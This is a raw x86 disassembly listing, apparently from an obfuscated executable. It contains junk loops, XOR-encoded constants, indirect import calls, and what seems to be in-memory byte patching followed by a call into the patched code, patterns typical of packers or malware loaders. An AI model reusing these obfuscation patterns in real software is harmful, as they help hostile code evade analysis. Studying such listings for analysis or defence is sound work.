  40d732:	xor    edi,eax
  40d734:	add    edx,edi
  40d736:	mov    edi,DWORD PTR [ebp-0x8]
  40d739:	lea    edx,[edx+edi*1+0x32729a]
  40d740:	mov    DWORD PTR [ebp-0x8],edx
  40d743:	mov    edx,DWORD PTR [ebp-0x20]
  40d746:	xor    edx,eax
  40d748:	mov    edi,0xffcd8d66
  40d74d:	sub    edi,edx
  40d74f:	add    edi,DWORD PTR [ebp-0x10]
  40d752:	mov    edx,DWORD PTR [ebp-0x20]
  40d755:	mov    ebx,DWORD PTR [ebp-0x8]
  40d758:	xor    edx,eax
  40d75a:	add    edx,ecx
  40d75c:	imul   edx,ebx
  40d75f:	cmp    edx,edi
  40d761:	jbe    0x40a06e
  40d767:	pop    ebx
  40d768:	pop    edi
  40d769:	leave  
  40d76a:	ret    0x8
  40d76d:	push   ebp
  40d76e:	mov    ebp,esp
  40d770:	sub    esp,0xa8
  40d776:	and    DWORD PTR ds:0x43359b,0x6624
  40d780:	push   ebx
  40d781:	adc    DWORD PTR ds:0x433563,0x6b43
  40d78b:	push   esi
  40d78c:	push   edi
  40d78d:	sbb    DWORD PTR ds:0x43361f,0x4335a7
  40d797:	push   0x413c96
  40d79c:	sub    DWORD PTR ds:0x43354b,0x433663
  40d7a6:	call   DWORD PTR ds:0x412194
  40d7ac:	push   0x413cbe
  40d7b1:	sub    DWORD PTR ds:0x433623,0x43353f
  40d7bb:	call   DWORD PTR ds:0x412174
  40d7c1:	test   eax,eax
  40d7c3:	je     0x40d7d1
  40d7c9:	push   0x2
  40d7cb:	pop    eax
  40d7cc:	jmp    0x40e1cc
  40d7d1:	and    DWORD PTR ds:0x4335b3,0x0
  40d7db:	xor    ecx,ecx
  40d7dd:	xor    ecx,DWORD PTR ds:0x4335b3
  40d7e3:	inc    ecx
  40d7e4:	mov    DWORD PTR ds:0x4335b3,ecx
  40d7ea:	cmp    DWORD PTR ds:0x4335b3,0x24
  40d7f1:	jne    0x40d80b
  40d7f7:	push   DWORD PTR [ebp-0x28]
  40d7fa:	push   DWORD PTR [ebp-0x20]
  40d7fd:	push   0x38c3
  40d802:	push   DWORD PTR [ebp-0x14]
  40d805:	call   DWORD PTR ds:0x412274
  40d80b:	cmp    DWORD PTR ds:0x4335b3,0x1e
  40d812:	jb     0x40d7db
  40d818:	or     DWORD PTR ds:0x433547,0x433667
  40d822:	mov    DWORD PTR [ebp-0x24],0xf89c8535
  40d829:	dec    ecx
  40d82a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40d831:	add    ecx,ecx
  40d833:	lea    eax,[ebp-0x2c]
  40d836:	and    DWORD PTR ds:0x43354f,0x0
  40d840:	jmp    0x40d852
  40d845:	mov    ecx,DWORD PTR ds:0x43354f
  40d84b:	inc    ecx
  40d84c:	mov    DWORD PTR ds:0x43354f,ecx
  40d852:	cmp    DWORD PTR ds:0x43354f,0x10
  40d859:	jae    0x40d899
  40d85f:	cmp    DWORD PTR ds:0x43354f,0x4
  40d866:	jne    0x40d87a
  40d86c:	push   0x42d1
  40d871:	push   DWORD PTR [ebp-0x28]
  40d874:	call   DWORD PTR ds:0x4121a0
  40d87a:	cmp    DWORD PTR ds:0x43354f,0x3
  40d881:	jne    0x40d894
  40d887:	mov    ecx,DWORD PTR ds:0x43354f
  40d88d:	inc    ecx
  40d88e:	mov    DWORD PTR ds:0x43354f,ecx
  40d894:	jmp    0x40d845
  40d899:	mov    DWORD PTR [ebp-0x18],eax
  40d89c:	xor    esi,esi
  40d89e:	add    esi,DWORD PTR ds:0x43361b
  40d8a4:	add    esi,DWORD PTR ds:0x4335e3
  40d8aa:	mov    DWORD PTR ds:0x43361b,esi
  40d8b0:	lea    eax,[ebp-0x30]
  40d8b3:	inc    edi
  40d8b4:	mov    DWORD PTR [ebp-0x14],eax
  40d8b7:	mov    eax,ds:0x433547
  40d8bc:	and    eax,DWORD PTR ds:0x4335af
  40d8c2:	mov    ds:0x433547,eax
  40d8c7:	mov    eax,ds:0x413b16
  40d8cc:	sbb    DWORD PTR ds:0x433553,ebx
  40d8d2:	mov    eax,DWORD PTR [eax+0x1c8]
  40d8d8:	mov    eax,DWORD PTR [eax]
  40d8da:	and    DWORD PTR ds:0x43365b,0x0
  40d8e4:	jmp    0x40d8f8
  40d8e9:	xor    edi,edi
  40d8eb:	or     edi,DWORD PTR ds:0x43365b
  40d8f1:	inc    edi
  40d8f2:	mov    DWORD PTR ds:0x43365b,edi
  40d8f8:	cmp    DWORD PTR ds:0x43365b,0x1c
  40d8ff:	jae    0x40d922
  40d905:	cmp    DWORD PTR ds:0x43365b,0x25
  40d90c:	jne    0x40d91d
  40d912:	push   0x6b44
  40d917:	call   DWORD PTR ds:0x4121a4
  40d91d:	jmp    0x40d8e9
  40d922:	mov    ecx,DWORD PTR [ebp-0x14]
  40d925:	sbb    DWORD PTR ds:0x4335a7,0x43365f
  40d92f:	mov    esi,0x7510853
  40d934:	movzx  edi,BYTE PTR ds:0x433553
  40d93b:	and    edi,DWORD PTR ds:0x43362f
  40d941:	mov    DWORD PTR ds:0x433553,edi
  40d947:	xor    eax,esi
  40d949:	mov    DWORD PTR ds:0x4335a7,0x13
  40d953:	cmp    DWORD PTR ds:0x4335a7,0x0
  40d95a:	je     0x40d9b9
  40d960:	cmp    DWORD PTR ds:0x4335a7,0x3
  40d967:	jne    0x40d985
  40d96d:	push   0x5b51
  40d972:	push   DWORD PTR [ebp-0x18]
  40d975:	push   0x1bb9
  40d97a:	push   0x295c
  40d97f:	call   DWORD PTR ds:0x412278
  40d985:	cmp    DWORD PTR ds:0x4335a7,0x4
  40d98c:	jne    0x40d99f
  40d992:	mov    edi,DWORD PTR ds:0x4335a7
  40d998:	dec    edi
  40d999:	mov    DWORD PTR ds:0x4335a7,edi
  40d99f:	xor    edi,edi
  40d9a1:	add    edi,DWORD PTR ds:0x4335a7
  40d9a7:	dec    edi
  40d9a8:	mov    DWORD PTR ds:0x4335a7,edi
  40d9ae:	jmp    0x40d953
  40d9b3:	xor    ebx,DWORD PTR ds:0x43354f
  40d9b9:	mov    edi,0x32729a
  40d9be:	add    eax,edi
  40d9c0:	mov    DWORD PTR [ecx],eax
  40d9c2:	mov    eax,ds:0x413dda
  40d9c7:	mov    DWORD PTR ds:0x4335db,ecx
  40d9cd:	cmp    eax,0x22c02f45
  40d9d2:	mov    DWORD PTR ds:0x4335f3,ecx
  40d9d8:	mov    eax,DWORD PTR [ebp-0x4]
  40d9db:	mov    ebx,DWORD PTR ds:0x43359f
  40d9e1:	mov    ebx,0xf89c8539
  40d9e6:	je     0x40da18
  40d9ec:	sub    DWORD PTR ds:0x43355f,edx
  40d9f2:	mov    ecx,DWORD PTR [ebp-0x24]
  40d9f5:	xor    eax,esi
  40d9f7:	add    eax,edi
  40d9f9:	imul   eax,ecx
  40d9fc:	mov    DWORD PTR ds:0x433663,0x5372
  40da06:	mov    DWORD PTR [ebp-0x24],eax
  40da09:	mov    DWORD PTR ds:0x4335eb,0x4650
  40da13:	jmp    0x40db46
  40da18:	xor    eax,esi
  40da1a:	movzx  ecx,WORD PTR ds:0x43354f
  40da21:	sub    DWORD PTR ds:0x433567,ecx
  40da27:	add    eax,edi
  40da29:	mov    ds:0x413c2a,eax
  40da2e:	xor    DWORD PTR ds:0x43355b,edi
  40da34:	mov    eax,DWORD PTR [ebp-0x24]
  40da37:	xor    eax,esi
  40da39:	and    DWORD PTR ds:0x43362f,0x0
  40da43:	jmp    0x40da55
  40da48:	mov    ecx,DWORD PTR ds:0x43362f
  40da4e:	inc    ecx
  40da4f:	mov    DWORD PTR ds:0x43362f,ecx
  40da55:	cmp    DWORD PTR ds:0x43362f,0x19
  40da5c:	jae    0x40da9d
  40da62:	cmp    DWORD PTR ds:0x43362f,0xe
  40da69:	jne    0x40da78
  40da6f:	push   DWORD PTR [ebp-0x14]
  40da72:	call   DWORD PTR ds:0x41227c
  40da78:	cmp    DWORD PTR ds:0x43362f,0xd
  40da7f:	jne    0x40da92
  40da85:	mov    ecx,DWORD PTR ds:0x43362f
  40da8b:	inc    ecx
  40da8c:	mov    DWORD PTR ds:0x43362f,ecx
  40da92:	jmp    0x40da48
  40da97:	sbb    DWORD PTR ds:0x43365b,edx
  40da9d:	add    eax,edi
  40da9f:	and    DWORD PTR ds:0x433597,0x0
  40daa9:	jmp    0x40dabd
  40daae:	xor    ecx,ecx
  40dab0:	or     ecx,DWORD PTR ds:0x433597
  40dab6:	inc    ecx
  40dab7:	mov    DWORD PTR ds:0x433597,ecx
  40dabd:	cmp    DWORD PTR ds:0x433597,0x15
  40dac4:	jae    0x40daf7
  40daca:	cmp    DWORD PTR ds:0x433597,0x1c
  40dad1:	jne    0x40daf2
  40dad7:	push   0x1c72
  40dadc:	push   DWORD PTR [ebp-0xc]
  40dadf:	push   DWORD PTR [ebp-0x14]
  40dae2:	push   0x433874
  40dae7:	push   0x400000
  40daec:	call   DWORD PTR ds:0x412280
  40daf2:	jmp    0x40daae
  40daf7:	mov    ds:0x413dda,eax
  40dafc:	mov    eax,DWORD PTR [ebp-0x4]
  40daff:	or     DWORD PTR ds:0x433563,0x6d3e
  40db09:	mov    ecx,DWORD PTR ds:0x413c2a
  40db0f:	adc    DWORD PTR ds:0x4335a7,0x43354f
  40db19:	xor    eax,esi
  40db1b:	adc    DWORD PTR ds:0x433657,0x260d
  40db25:	add    eax,edi
  40db27:	cmp    ecx,eax
  40db29:	mov    DWORD PTR ds:0x433543,0x58a9
  40db33:	jne    0x40db46
  40db39:	push   ebx
  40db3a:	push   DWORD PTR [ebp-0x4]
  40db3d:	push   DWORD PTR [ebp-0x24]
  40db40:	call   DWORD PTR ds:0x413c22
  40db46:	or     DWORD PTR ds:0x433547,0x68cd
  40db50:	mov    eax,ds:0x413b16
  40db55:	mov    ecx,DWORD PTR ds:0x4335cf
  40db5b:	mov    ecx,DWORD PTR [ecx]
  40db5d:	or     DWORD PTR ds:0x433563,ecx
  40db63:	mov    eax,DWORD PTR [eax+0x18c]
  40db69:	and    DWORD PTR ds:0x43361f,0x0
  40db73:	mov    ecx,DWORD PTR ds:0x43361f
  40db79:	inc    ecx
  40db7a:	mov    DWORD PTR ds:0x43361f,ecx
  40db80:	cmp    DWORD PTR ds:0x43361f,0x21
  40db87:	jne    0x40db9d
  40db8d:	push   0x43361f
  40db92:	push   0x4b8b
  40db97:	call   DWORD PTR ds:0x4121a8
  40db9d:	cmp    DWORD PTR ds:0x43361f,0x1b
  40dba4:	jb     0x40db73
  40dbaa:	mov    eax,DWORD PTR [eax]
  40dbac:	sbb    DWORD PTR ds:0x43359f,0x7dd1
  40dbb6:	mov    DWORD PTR [ebp-0x44],eax
  40dbb9:	mov    DWORD PTR ds:0x433627,0x12
  40dbc3:	cmp    DWORD PTR ds:0x433627,0x0
  40dbca:	je     0x40dc20
  40dbd0:	cmp    DWORD PTR ds:0x433627,0x6
  40dbd7:	jne    0x40dbf0
  40dbdd:	push   0x2c3a
  40dbe2:	push   0x433667
  40dbe7:	push   DWORD PTR [ebp-0x20]
  40dbea:	call   DWORD PTR ds:0x4121ac
  40dbf0:	cmp    DWORD PTR ds:0x433627,0x7
  40dbf7:	jne    0x40dc0a
  40dbfd:	mov    ecx,DWORD PTR ds:0x433627
  40dc03:	dec    ecx
  40dc04:	mov    DWORD PTR ds:0x433627,ecx
  40dc0a:	xor    ecx,ecx
  40dc0c:	or     ecx,DWORD PTR ds:0x433627
  40dc12:	dec    ecx
  40dc13:	mov    DWORD PTR ds:0x433627,ecx
  40dc19:	jmp    0x40dbc3
  40dc1e:	xor    edx,eax
  40dc20:	mov    DWORD PTR [ebp-0x10],ebx
  40dc23:	and    DWORD PTR ds:0x433617,0x0
  40dc2d:	xor    eax,eax
  40dc2f:	or     eax,DWORD PTR ds:0x433617
  40dc35:	inc    eax
  40dc36:	mov    ds:0x433617,eax
  40dc3b:	cmp    DWORD PTR ds:0x433617,0x5
  40dc42:	jne    0x40dc5a
  40dc48:	push   0x433775
  40dc4d:	push   0x1
  40dc4f:	push   0x1
  40dc51:	push   DWORD PTR [ebp-0x20]
  40dc54:	call   DWORD PTR ds:0x4121b0
  40dc5a:	cmp    DWORD PTR ds:0x433617,0x4
  40dc61:	jne    0x40dc72
  40dc67:	mov    eax,ds:0x433617
  40dc6c:	inc    eax
  40dc6d:	mov    ds:0x433617,eax
  40dc72:	cmp    DWORD PTR ds:0x433617,0x18
  40dc79:	jb     0x40dc2d
  40dc7f:	and    DWORD PTR ds:0x43354b,ecx
  40dc85:	mov    DWORD PTR [ebp-0x10],ebx
  40dc88:	mov    DWORD PTR [ebp-0x10],ebx
  40dc8b:	sbb    DWORD PTR ds:0x433547,ebx
  40dc91:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40dc98:	and    DWORD PTR ds:0x433673,0x6700
  40dca2:	mov    DWORD PTR [ebp-0x10],ebx
  40dca5:	and    DWORD PTR ds:0x43359f,0x0
  40dcaf:	jmp    0x40dcc1
  40dcb4:	mov    ecx,DWORD PTR ds:0x43359f
  40dcba:	inc    ecx
  40dcbb:	mov    DWORD PTR ds:0x43359f,ecx
  40dcc1:	cmp    DWORD PTR ds:0x43359f,0x1d
  40dcc8:	jae    0x40dd19
  40dcce:	cmp    DWORD PTR ds:0x43359f,0x7
  40dcd5:	jne    0x40dce4
  40dcdb:	push   DWORD PTR [ebp-0x1c]
  40dcde:	call   DWORD PTR ds:0x4121b4
  40dce4:	cmp    DWORD PTR ds:0x43359f,0x6
  40dceb:	jne    0x40dd00
  40dcf1:	xor    ecx,ecx
  40dcf3:	add    ecx,DWORD PTR ds:0x43359f
  40dcf9:	inc    ecx
  40dcfa:	mov    DWORD PTR ds:0x43359f,ecx
  40dd00:	jmp    0x40dcb4
  40dd05:	xor    edx,edx
  40dd07:	or     edx,DWORD PTR ds:0x4335a7
  40dd0d:	sbb    edx,DWORD PTR ds:0x433667
  40dd13:	mov    DWORD PTR ds:0x4335a7,edx
  40dd19:	mov    DWORD PTR [ebp-0x10],0xf89c853d
  40dd20:	mov    ecx,DWORD PTR ds:0x43366b
  40dd26:	or     DWORD PTR ds:0x43361b,ecx
  40dd2c:	mov    eax,DWORD PTR [ebp-0x24]
  40dd2f:	sbb    edx,ecx
  40dd31:	mov    ecx,DWORD PTR [ebp-0x4]
  40dd34:	mov    edx,DWORD PTR ds:0x4335b3
  40dd3a:	and    DWORD PTR ds:0x43361f,edx
  40dd40:	mov    edx,DWORD PTR [ebp-0x4]
  40dd43:	xor    edx,esi
  40dd45:	xor    ecx,esi
  40dd47:	add    ecx,edx
  40dd49:	mov    edx,DWORD PTR [ebp-0x4]
  40dd4c:	xor    eax,esi
  40dd4e:	xor    edx,esi
  40dd50:	add    eax,edi
  40dd52:	mov    DWORD PTR ds:0x433557,0x7934
  40dd5c:	lea    ecx,[ecx+edx*1+0x9757ce]
  40dd63:	mov    DWORD PTR ds:0x43354f,0x1f1b
  40dd6d:	mov    DWORD PTR [ebp-0x20],eax
  40dd70:	mov    DWORD PTR ds:0x43355b,0xf60
  40dd7a:	cmp    eax,ecx
  40dd7c:	mov    DWORD PTR ds:0x43366b,0x7c7a
  40dd86:	ja     0x40dec6
  40dd8c:	jmp    0x40dd9e
  40dd91:	sbb    DWORD PTR ds:0x43361b,0x74d8
  40dd9b:	mov    eax,DWORD PTR [ebp-0x20]
  40dd9e:	and    DWORD PTR ds:0x43355b,edi
  40dda4:	mov    ecx,DWORD PTR [ebp-0x4]
  40dda7:	or     DWORD PTR ds:0x4335a7,0x43362f
  40ddb1:	xor    ecx,esi
  40ddb3:	adc    DWORD PTR ds:0x43365f,0x2704
  40ddbd:	lea    eax,[ecx+eax*1+0x32729a]
  40ddc4:	and    DWORD PTR ds:0x43359f,0x7330
  40ddce:	push   eax
  40ddcf:	mov    eax,DWORD PTR [ebp-0x14]
  40ddd2:	xor    eax,esi
  40ddd4:	and    DWORD PTR ds:0x43355b,0x43362f
  40ddde:	lea    eax,[ebp+eax*1+0x3272a2]
  40dde5:	push   eax
  40dde6:	mov    eax,ds:0x43354b
  40ddeb:	or     DWORD PTR ds:0x4335df,eax
  40ddf1:	mov    eax,ds:0x413b16
  40ddf6:	push   DWORD PTR [eax+0x1bc]
  40ddfc:	adc    DWORD PTR ds:0x43365b,0x4335b3
  40de06:	call   0x403290
  40de0b:	add    DWORD PTR ds:0x433663,0x32bd
  40de15:	mov    eax,DWORD PTR [ebp-0x4]
  40de18:	mov    ecx,DWORD PTR [ebp-0x20]
  40de1b:	sbb    DWORD PTR ds:0x4335ef,ecx
  40de21:	xor    eax,esi
  40de23:	and    DWORD PTR ds:0x4335ab,0x0
  40de2d:	mov    edx,DWORD PTR ds:0x4335ab
  40de33:	inc    edx
  40de34:	mov    DWORD PTR ds:0x4335ab,edx
  40de3a:	cmp    DWORD PTR ds:0x4335ab,0x23
  40de41:	jne    0x40de57
  40de47:	push   0x303f
  40de4c:	push   0x8a6d
  40de51:	call   DWORD PTR ds:0x4121b8
  40de57:	cmp    DWORD PTR ds:0x4335ab,0x15
  40de5e:	jb     0x40de2d
  40de64:	lea    eax,[ecx+eax*1+0x32729a]
  40de6b:	sbb    DWORD PTR ds:0x433667,0x3009
  40de75:	mov    ecx,DWORD PTR [ebp-0x4]
  40de78:	mov    edx,DWORD PTR [ebp-0x4]
  40de7b:	xor    edx,esi
  40de7d:	add    DWORD PTR ds:0x43361b,0x46c0
  40de87:	xor    ecx,esi
  40de89:	xor    DWORD PTR ds:0x433657,0x4fa5
  40de93:	add    ecx,edx
  40de95:	and    edx,DWORD PTR ds:0x433663
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	adc    DWORD PTR ds:0x433597,0x7c2
  40dea8:	xor    edx,esi
  40deaa:	lea    ecx,[ecx+edx*1+0x9757ce]
  40deb1:	mov    DWORD PTR [ebp-0x20],eax
  40deb4:	cmp    eax,ecx
  40deb6:	mov    DWORD PTR ds:0x4335e7,0x1689
  40dec0:	jbe    0x40dd91
  40dec6:	mov    eax,DWORD PTR [ebp+0xc]
  40dec9:	mov    ds:0x41399a,eax
  40dece:	mov    eax,DWORD PTR [ebp+0x10]
  40ded1:	mov    ds:0x413bee,eax
  40ded6:	mov    eax,ds:0x41399a
  40dedb:	mov    ecx,DWORD PTR [ebp-0x18]
  40dede:	push   DWORD PTR [ebp-0x44]
  40dee1:	sub    eax,edi
  40dee3:	push   DWORD PTR [ebp-0x30]
  40dee6:	xor    eax,esi
  40dee8:	mov    DWORD PTR [ecx],eax
  40deea:	push   DWORD PTR [ebp-0x2c]
  40deed:	call   0x40e1d3
  40def2:	sub    eax,edi
  40def4:	xor    eax,esi
  40def6:	mov    DWORD PTR [ebp+0xc],eax
  40def9:	mov    ecx,DWORD PTR [ebp-0x4]
  40defc:	mov    eax,DWORD PTR [ebp+0xc]
  40deff:	xor    ecx,esi
  40df01:	add    ecx,edi
  40df03:	xor    edx,edx
  40df05:	div    ecx
  40df07:	mov    ecx,DWORD PTR [ebp-0x24]
  40df0a:	cmp    ecx,eax
  40df0c:	jne    0x40e135
  40df12:	mov    eax,ds:0x413b16
  40df17:	mov    DWORD PTR [ebp+0x10],eax
  40df1a:	mov    eax,ds:0x413c26
  40df1f:	mov    DWORD PTR [ebp-0x50],eax
  40df22:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40df29:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  40df30:	mov    DWORD PTR [ebp-0x4c],0xf89cb535
  40df37:	mov    DWORD PTR [ebp-0x64],0xf89f0535
  40df3e:	mov    DWORD PTR [ebp-0x60],0xf89c85f5
  40df45:	mov    DWORD PTR [ebp-0x54],0xf89c85d5
  40df4c:	mov    eax,DWORD PTR [ebp-0x18]
  40df4f:	xor    eax,esi
  40df51:	add    eax,edi
  40df53:	mov    DWORD PTR [ebp-0xc],eax
  40df56:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40df5d:	mov    BYTE PTR [ebp-0x25],0x67
  40df61:	mov    eax,DWORD PTR [ebp-0x18]
  40df64:	xor    eax,esi
  40df66:	add    eax,edi
  40df68:	mov    DWORD PTR [ebp-0xc],eax
  40df6b:	mov    eax,DWORD PTR [ebp-0x54]
  40df6e:	xor    eax,esi
  40df70:	add    eax,edi
  40df72:	mov    DWORD PTR [ebp-0x40],eax
  40df75:	mov    eax,DWORD PTR [ebp-0x4c]
  40df78:	xor    eax,esi
  40df7a:	add    eax,edi
  40df7c:	mov    DWORD PTR [ebp-0x38],eax
  40df7f:	mov    eax,DWORD PTR [ebp-0x3c]
  40df82:	xor    eax,esi
  40df84:	add    eax,edi
  40df86:	mov    DWORD PTR [ebp-0x34],eax
  40df89:	lea    eax,[ebp-0xa8]
  40df8f:	mov    DWORD PTR [ebp+0xc],eax
  40df92:	mov    eax,DWORD PTR [ebp-0x18]
  40df95:	mov    DWORD PTR [ebp-0x14],eax
  40df98:	mov    eax,DWORD PTR [ebp-0x20]
  40df9b:	mov    DWORD PTR [ebp-0x5c],ebx
  40df9e:	mov    DWORD PTR [ebp-0x10],eax
  40dfa1:	mov    eax,DWORD PTR [ebp-0x5c]
  40dfa4:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfa7:	xor    eax,esi
  40dfa9:	add    eax,0x32729a
  40dfae:	mov    DWORD PTR [ecx],eax
  40dfb0:	mov    eax,DWORD PTR [ebp-0x14]
  40dfb3:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfb6:	xor    eax,esi
  40dfb8:	add    eax,edi
  40dfba:	mov    DWORD PTR [ecx+0x4],eax
  40dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  40dfc0:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfc3:	mov    DWORD PTR [ecx+0x8],eax
  40dfc6:	mov    eax,DWORD PTR [ebp-0x38]
  40dfc9:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfcc:	mov    DWORD PTR [ecx+0xc],eax
  40dfcf:	mov    eax,DWORD PTR [ebp-0x40]
  40dfd2:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd5:	mov    DWORD PTR [ecx+0x10],eax
  40dfd8:	mov    eax,eax
  40dfda:	mov    eax,DWORD PTR [ebp-0x10]
  40dfdd:	xor    eax,esi
  40dfdf:	add    eax,edi
  40dfe1:	je     0x40e012
  40dfe7:	lea    eax,[ebp-0xa8]
  40dfed:	push   eax
  40dfee:	mov    eax,DWORD PTR [ebp-0x20]
  40dff1:	xor    eax,esi
  40dff3:	add    eax,edi
  40dff5:	push   eax
  40dff6:	mov    eax,DWORD PTR [ebp+0x10]
  40dff9:	add    eax,0xaa
  40dffe:	push   eax
  40dfff:	mov    eax,DWORD PTR [ebp+0x10]
  40e002:	mov    eax,DWORD PTR [eax+0x198]
  40e008:	push   DWORD PTR [eax]
  40e00a:	call   0x4100b5
  40e00f:	mov    DWORD PTR [ebp-0x8],eax
  40e012:	cmp    DWORD PTR [ebp-0x8],0x0
  40e016:	je     0x40e135
  40e01c:	lea    eax,[ebp-0xc]
  40e01f:	mov    DWORD PTR [ebp-0x38],eax
  40e022:	mov    eax,DWORD PTR [ebp-0x60]
  40e025:	xor    eax,esi
  40e027:	add    eax,edi
  40e029:	mov    DWORD PTR [ebp-0x40],eax
  40e02c:	mov    eax,DWORD PTR [ebp-0x3c]
  40e02f:	xor    eax,esi
  40e031:	add    eax,edi
  40e033:	mov    DWORD PTR [ebp-0x10],eax
  40e036:	mov    eax,DWORD PTR [ebp-0x8]
  40e039:	mov    DWORD PTR [ebp-0x14],eax
  40e03c:	lea    eax,[ebp-0xa8]
  40e042:	mov    DWORD PTR [ebp+0xc],eax
  40e045:	mov    eax,DWORD PTR [ebp-0x18]
  40e048:	mov    DWORD PTR [ebp-0x18],eax
  40e04b:	mov    eax,DWORD PTR [ebp-0x20]
  40e04e:	mov    DWORD PTR [ebp-0x48],ebx
  40e051:	mov    DWORD PTR [ebp-0x34],eax
  40e054:	mov    eax,DWORD PTR [ebp-0x48]
  40e057:	mov    ecx,DWORD PTR [ebp+0xc]
  40e05a:	xor    eax,esi
  40e05c:	add    eax,0x32729a
  40e061:	mov    DWORD PTR [ecx],eax
  40e063:	mov    eax,DWORD PTR [ebp-0x14]
  40e066:	mov    ecx,DWORD PTR [ebp+0xc]
  40e069:	mov    DWORD PTR [ecx+0x4],eax
  40e06c:	mov    eax,DWORD PTR [ebp-0x10]
  40e06f:	mov    ecx,DWORD PTR [ebp+0xc]
  40e072:	mov    DWORD PTR [ecx+0x8],eax
  40e075:	mov    eax,DWORD PTR [ebp-0x40]
  40e078:	mov    ecx,DWORD PTR [ebp+0xc]
  40e07b:	mov    DWORD PTR [ecx+0xc],eax
  40e07e:	mov    eax,DWORD PTR [ebp-0x38]
  40e081:	mov    ecx,DWORD PTR [ebp+0xc]
  40e084:	mov    DWORD PTR [ecx+0x10],eax
  40e087:	mov    eax,eax
  40e089:	mov    eax,DWORD PTR [ebp-0x14]
  40e08c:	test   eax,eax
  40e08e:	mov    eax,DWORD PTR [ebp-0x34]
  40e091:	jne    0x40e09a
  40e097:	mov    eax,DWORD PTR [ebp-0x18]
  40e09a:	xor    eax,esi
  40e09c:	add    eax,edi
  40e09e:	test   eax,eax
  40e0a0:	je     0x40e0ce
  40e0a6:	lea    eax,[ebp-0xa8]
  40e0ac:	push   eax
  40e0ad:	mov    eax,DWORD PTR [ebp-0x20]
  40e0b0:	xor    eax,esi
  40e0b2:	add    eax,edi
  40e0b4:	push   eax
  40e0b5:	mov    eax,DWORD PTR [ebp+0x10]
  40e0b8:	add    eax,0xee
  40e0bd:	push   eax
  40e0be:	mov    eax,DWORD PTR [ebp+0x10]
  40e0c1:	mov    eax,DWORD PTR [eax+0x198]
  40e0c7:	push   DWORD PTR [eax]
  40e0c9:	call   0x4100b5
  40e0ce:	mov    ecx,DWORD PTR [ebp-0x3c]
  40e0d1:	xor    ecx,esi
  40e0d3:	mov    eax,0xffcd8d66
  40e0d8:	sub    eax,ecx
  40e0da:	sub    eax,DWORD PTR [ebp-0x8]
  40e0dd:	mov    ecx,DWORD PTR [ebp-0x50]
  40e0e0:	add    ecx,eax
  40e0e2:	mov    eax,DWORD PTR [ebp-0x8]
  40e0e5:	mov    DWORD PTR [eax+0x1],ecx
  40e0e8:	mov    al,BYTE PTR [ebp-0x25]
  40e0eb:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ee:	xor    al,0x45
  40e0f0:	sub    al,0x39
  40e0f2:	mov    BYTE PTR [ecx],al
  40e0f4:	lea    eax,[ebp-0x8]
  40e0f7:	inc    BYTE PTR [eax]
  40e0f9:	inc    eax
  40e0fa:	push   eax
  40e0fb:	pop    ecx
  40e0fc:	dec    ecx
  40e0fd:	xchg   ecx,edx
  40e0ff:	dec    BYTE PTR [edx]
  40e101:	push   DWORD PTR [ebp+0x10]
  40e104:	mov    eax,ds:0x413bd2
  40e109:	mov    eax,DWORD PTR [eax]
  40e10b:	push   DWORD PTR [eax]
  40e10d:	lea    eax,ds:0x413bee
  40e113:	push   DWORD PTR [eax]
  40e115:	lea    eax,ds:0x41399a
  40e11b:	push   DWORD PTR [eax]
  40e11d:	lea    eax,ds:0x413bce
  40e123:	push   DWORD PTR [eax]
  40e125:	lea    eax,ds:0x413d06
  40e12b:	push   DWORD PTR [eax]
  40e12d:	xchg   ebx,edx
  40e12f:	inc    ebx
  40e130:	push   ebx
  40e131:	pop    eax
  40e132:	call   DWORD PTR [eax-0x1]
  40e135:	lea    eax,[ebp+0x4]
  40e138:	mov    DWORD PTR [ebp-0x58],eax
  40e13b:	mov    eax,ds:0x413b16
  40e140:	push   0x4
  40e142:	add    eax,0x1cc
  40e147:	push   eax
  40e148:	lea    eax,[ebp-0x1c]
  40e14b:	push   eax
  40e14c:	call   0x403290
  40e151:	mov    eax,DWORD PTR [ebp-0x1c]
  40e154:	mov    eax,DWORD PTR [ebp-0x4]
  40e157:	mov    eax,DWORD PTR [ebp-0x24]
  40e15a:	mov    DWORD PTR [ebp+0xc],eax
  40e15d:	mov    eax,ds:0x413b9a
  40e162:	mov    ecx,DWORD PTR [ebp+0xc]
  40e165:	sub    eax,edi
  40e167:	xor    eax,esi
  40e169:	cmp    eax,ecx
  40e16b:	je     0x40e1b2
  40e171:	mov    eax,ds:0x413b92
  40e176:	mov    ecx,DWORD PTR [ebp+0xc]
  40e179:	sub    eax,edi
  40e17b:	xor    eax,esi
  40e17d:	cmp    eax,ecx
  40e17f:	jne    0x40e195
  40e185:	mov    eax,ds:0x413b9a
  40e18a:	add    eax,DWORD PTR ds:0x413b92
  40e190:	jmp    0x40e19c
  40e195:	mov    eax,DWORD PTR [ebp+0xc]
  40e198:	xor    eax,esi
  40e19a:	add    eax,edi
  40e19c:	mov    ds:0x413b92,eax
  40e1a1:	mov    eax,DWORD PTR [ebp+0xc]
  40e1a4:	xor    eax,esi
  40e1a6:	add    eax,edi
  40e1a8:	mov    ds:0x413b9a,eax
  40e1ad:	jmp    0x40e1bc
  40e1b2:	mov    eax,ds:0x413b9a
  40e1b7:	mov    ds:0x413b92,eax
  40e1bc:	mov    eax,DWORD PTR [ebp-0x58]
  40e1bf:	mov    ecx,DWORD PTR ds:0x413b92
  40e1c5:	add    DWORD PTR [eax],ecx
  40e1c7:	mov    eax,DWORD PTR [ebp-0x1c]
  40e1ca:	mov    eax,DWORD PTR [eax]
  40e1cc:	pop    edi
  40e1cd:	pop    esi
  40e1ce:	pop    ebx
  40e1cf:	leave  
  40e1d0:	ret    0xc
  40e1d3:	push   ebp
  40e1d4:	mov    ebp,esp
  40e1d6:	push   ecx
  40e1d7:	push   ecx
  40e1d8:	mov    DWORD PTR ds:0x433557,0x1ded
  40e1e2:	mov    eax,0xf89c8534
